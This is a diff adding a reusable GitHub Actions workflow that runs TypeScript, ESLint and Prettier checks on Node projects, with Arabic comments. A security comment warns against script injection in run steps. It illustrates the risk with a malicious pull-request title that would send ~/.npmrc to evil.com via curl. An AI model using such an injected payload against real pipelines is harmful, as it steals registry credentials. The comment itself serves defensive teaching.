@@ -1,0 +1,124 @@
+# ═══════════════════════════════════════════════════════════════════════
+#  Reusable Workflow — فحوصات الجودة الثابتة لمشاريع Node
+#
+#  هذا ليس workflow يعمل بنفسه — يُستدعى من workflows أخرى:
+#
+#      jobs:
+#        quality:
+#          uses: ./.github/workflows/reusable-node-checks.yml
+#          with:
+#            node-version: '20.19.0'
+#
+#  لماذا؟ لو عندك 10 مشاريع في الشركة، بدون هذا النمط تنسخ نفس
+#  الـ 40 سطراً عشر مرات. عند تغيير قاعدة واحدة تعدّل عشرة ملفات
+#  وتنسى اثنين. مع Reusable Workflow: ملف واحد، والباقي يستدعيه.
+#
+#  للمشاركة بين مستودعات مختلفة، ضعه في مستودع مركزي واستدعِه:
+#      uses: MyOrg/.github/.github/workflows/reusable-node-checks.yml@main
+#
+#  الفرق عن Composite Action:
+#    • Composite Action = مجموعة خطوات داخل job واحد (مثل setup عندنا)
+#    • Reusable Workflow = job كامل أو أكثر، بصلاحياته وأسراره ومخرجاته
+# ═══════════════════════════════════════════════════════════════════════
+name: Reusable — فحوصات Node
+
+on:
+  workflow_call:
+    inputs:
+      node-version:
+        description: 'إصدار Node (فارغ = يُقرأ من .nvmrc)'
+        required: false
+        type: string
+        default: ''
+      max-warnings:
+        description: 'السقف الأعلى لتحذيرات ESLint'
+        required: false
+        type: number
+        default: 254
+      upload-reports:
+        description: 'رفع تقرير ESLint كـ artifact'
+        required: false
+        type: boolean
+        default: true
+    outputs:
+      warnings:
+        description: 'عدد تحذيرات ESLint المرصودة'
+        value: ${{ jobs.checks.outputs.warnings }}
+
+permissions:
+  contents: read
+
+jobs:
+  checks:
+    name: فحوصات الجودة
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    outputs:
+      warnings: ${{ steps.lint.outputs.warnings }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+
+      - uses: ./.github/actions/setup
+        with:
+          node-version: ${{ inputs.node-version }}
+
+      - name: فحص الأنواع (TypeScript)
+        run: npm run typecheck
+
+      # ⚠️ أمان: لا تضع ${{ ... }} داخل run: أبداً.
+      #
+      #  GitHub يستبدل التعبير نصياً *قبل* تنفيذ الـ shell، فتصير
+      #  القيمة جزءاً من الأمر نفسه. لو أتت من مصدر يتحكّم فيه مهاجم
+      #  (عنوان PR، اسم فرع، نص تعليق) أمكنه حقن أوامر:
+      #
+      #      run: echo "${{ github.event.pull_request.title }}"
+      #      العنوان: '; curl evil.com -d $(cat ~/.npmrc) #'
+      #
+      #  الحل: مرّرها عبر env ثم استخدم $VAR — عندها يعاملها الـ shell
+      #  بياناتٍ لا كوداً. هذه الثغرة اكتشفها Semgrep في هذا الملف نفسه.
+      - name: فحص ESLint
+        id: lint
+        env:
+          MAX_WARNINGS: ${{ inputs.max-warnings }}
+        run: |
+          mkdir -p reports
+          # نلتقط العدد الفعلي للتحذيرات لمراقبة اتجاه السقف عبر الزمن
+          set +e
+          OUT=$(npx eslint . --max-warnings "$MAX_WARNINGS" 2>&1)
+          CODE=$?
+          set -e
+          echo "$OUT"
+
+          COUNT=$(echo "$OUT" | grep -oE "[0-9]+ warnings?" | tail -1 | grep -oE "[0-9]+" || echo 0)
+          echo "warnings=$COUNT" >> "$GITHUB_OUTPUT"
+
+          {
+            echo "### 🔍 الجودة الثابتة"
+            echo "| المقياس | القيمة |"
+            echo "|---|---|"
+            echo "| تحذيرات ESLint | $COUNT |"
+            echo "| السقف الحالي | $MAX_WARNINGS |"
+            echo "| الفارق | $(( MAX_WARNINGS - COUNT )) |"
+            echo ""
+            if [ "$COUNT" -lt "$MAX_WARNINGS" ]; then
+              echo "🎉 التحذيرات أقل من السقف — يمكن خفضه إلى **$COUNT** في package.json."
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
+
+          exit $CODE
+
+      - name: فحص التنسيق (Prettier)
+        run: npm run format:check
+
+      - name: توليد تقرير ESLint
+        if: always() && inputs.upload-reports
+        run: npm run lint:report
+
+      - name: رفع تقرير ESLint
+        if: always() && inputs.upload-reports
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: eslint-report
+          path: reports/
+          retention-days: 7
+          if-no-files-found: warn
